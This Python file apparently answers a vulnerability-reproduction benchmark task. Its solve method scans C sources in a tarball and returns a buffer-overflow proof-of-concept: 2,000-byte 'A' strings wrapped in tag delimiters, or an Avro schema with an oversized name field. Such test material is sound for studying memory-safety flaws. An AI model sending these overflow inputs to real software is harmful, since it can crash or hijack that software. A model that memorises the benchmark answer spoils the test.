import tarfile
import re

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        Args:
            src_path: Path to the vulnerable source code tarball
            
        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # Default payload strategy: XML-like tag buffer overflow
        # Ground truth length is 1461, so we generate a payload larger than this (e.g., 2000)
        # to ensure the stack buffer (likely 1024 or similar) is overflowed and the return address overwritten.
        # We wrap the overflow pattern in <...> as "tag" usually implies this format.
        default_payload = b"<" + b"A" * 2000 + b">"
        
        try:
            # Inspect source code to determine if the target is standard 'arvo' (generic tag parser)
            # or potentially 'avro' (Apache Avro) due to naming similarity, or uses different delimiters.
            with tarfile.open(src_path, 'r:*') as tar:
                for member in tar.getmembers():
                    if member.isfile() and (member.name.endswith('.c') or member.name.endswith('.cpp') or member.name.endswith('.h')):
                        f = tar.extractfile(member)
                        if not f:
                            continue
                        content = f.read().decode('latin-1', errors='ignore')
                        
                        # Check for Apache Avro indications
                        # Avro vulnerabilities often involve schema parsing (JSON) with long strings
                        if "avro" in content.lower():
                            # Construct a JSON Avro schema with an excessively long name field
                            prefix = '{"type":"record","name":"'
                            suffix = '","fields":[]}'
                            fill_length = 2000
                            return (prefix + "A" * fill_length + suffix).encode()
                        
                        # Heuristics for tag delimiters based on character literals in code
                        # If the code checks for ']', it likely parses [tag]
                        if "']'" in content and "'['" in content:
                            return b"[" + b"A" * 2000 + b"]"
                        
                        # If the code checks for '}', it likely parses {tag}
                        if "'}'" in content and "'{'" in content:
                            return b"{" + b"A" * 2000 + b"}"
                            
                        # If the code checks for '>', it confirms the default XML style
                        if "'>'" in content:
                            return default_payload

        except Exception:
            # Fallback to default if source analysis fails
            pass
            
        return default_payload
